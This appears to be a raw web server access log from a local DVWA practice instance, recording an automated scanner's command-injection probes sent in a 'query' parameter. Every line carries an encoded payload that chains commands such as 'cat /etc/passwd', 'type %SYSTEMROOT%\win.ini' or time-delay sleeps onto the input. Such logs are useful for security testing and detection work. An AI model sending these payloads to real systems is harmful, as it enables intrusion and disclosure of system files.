172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 301 594 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 301 592 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%26sleep+15%26 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3Bsleep+15%3B HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 301 614 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 301 614 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 301 614 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 301 614 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%26sleep+15%26 HTTP/1.1" 301 580 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%3Bsleep+15%3B HTTP/1.1" 301 580 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%26sleep+15%26%22 HTTP/1.1" 301 611 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 301 592 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 301 590 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 301 590 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 301 638 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 301 638 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%26timeout+%2FT+15 HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 301 606 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 301 594 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 301 604 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 301 598 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%3Bget-help HTTP/1.1" 301 574 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%3Bget-help HTTP/1.1" 301 580 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%27%3Bget-help HTTP/1.1" 301 580 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%3Bget-help+%23 HTTP/1.1" 301 582 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 301 592 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 301 598 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 301 600 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%26sleep+15%26 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%3Bsleep+15%3B HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 1112 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%26timeout+%2FT+15 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%3Bget-help HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%3Bget-help HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%27%3Bget-help HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%3Bget-help+%23 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/login.css?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%26timeout+%2FT+15 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%26sleep+15%26 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%3Bsleep+15%3B HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css/main.css?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
